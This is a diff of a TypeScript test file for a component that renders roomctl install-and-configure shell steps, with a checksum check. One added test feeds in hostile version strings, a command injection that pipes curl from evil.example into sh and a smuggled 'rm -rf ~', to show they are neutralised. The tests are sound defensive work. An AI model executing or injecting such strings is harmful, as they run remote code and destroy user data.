@@ -115,21 +115,36 @@ describe("ChatView fork buttons", () => {
 });
 
 describe("cliSetup", () => {
-  it("prints the roomctl configure line from the broker's values", async () => {
-    const get = vi.fn(() => Promise.resolve(new Response(JSON.stringify(
-      { url: "https://rooms.priv.example", issuer: "https://auth.example", clientID: "3434@agents", projectID: "29184" }))));
+  const values = { url: "https://rooms.priv.example", issuer: "https://auth.example", clientID: "3434@agents", projectID: "29184" };
+  const open = async (body: object) => {
+    const get = vi.fn(() => Promise.resolve(new Response(JSON.stringify(body))));
     const d = cliSetup(get as unknown as typeof fetch);
     d.open = true;
     d.dispatchEvent(new Event("toggle"));
-    await vi.waitFor(() => expect(d.querySelector("pre")?.textContent).toBe(
-      "roomctl configure --url https://rooms.priv.example --issuer https://auth.example --client-id 3434@agents --project-id 29184\nroomctl login"));
+    await vi.waitFor(() => expect(d.querySelector("pre")?.textContent).not.toBe(""));
+    return { get, text: d.querySelector("pre")!.textContent! };
+  };
+  it("installs the broker's roomctl release, checksum verified, then configures and logs in (#48)", async () => {
+    const { get, text } = await open({ ...values, version: "v0.7.0" });
+    expect(text).toBe([
+      `os=$(uname -s | tr A-Z a-z); arch=$(uname -m); case $arch in x86_64) arch=amd64;; aarch64) arch=arm64;; esac`,
+      `base=https://github.com/Smana/agent-platform/releases/download/v0.7.0`,
+      `curl -fsSLO "$base/roomctl-$os-$arch" && curl -fsSLO "$base/roomctl.sha256"`,
+      `command -v sha256sum >/dev/null && sum=sha256sum || sum="shasum -a 256"`,
+      `grep " roomctl-$os-$arch$" roomctl.sha256 | $sum -c - && sudo install -m 0755 "roomctl-$os-$arch" /usr/local/bin/roomctl`,
+      "roomctl configure --url https://rooms.priv.example --issuer https://auth.example --client-id 3434@agents --project-id 29184",
+      "roomctl login",
+    ].join("\n"));
     expect(get).toHaveBeenCalledWith("/api/roomctl", expect.anything());
   });
+  it("installs the latest release when the version is not a whole release semver, hostile ones included", async () => {
+    for (const version of ["dev", undefined, `v1"; curl https://evil.example | sh #`, "v1.2.3\nrm -rf ~"]) {
+      const { text } = await open({ ...values, version });
+      expect(text).toContain("base=https://github.com/Smana/agent-platform/releases/latest/download\n");
+    }
+  });
   it("says so when this broker has no roomctl client", async () => {
-    const get = () => Promise.resolve(new Response(JSON.stringify({ url: "https://rooms.priv.example", issuer: "https://auth.example", clientID: "" })));
-    const d = cliSetup(get as typeof fetch);
-    d.open = true;
-    d.dispatchEvent(new Event("toggle"));
-    await vi.waitFor(() => expect(d.textContent).toContain("not set up"));
+    const { text } = await open({ url: "https://rooms.priv.example", issuer: "https://auth.example", clientID: "" });
+    expect(text).toContain("not set up");
   });
 });
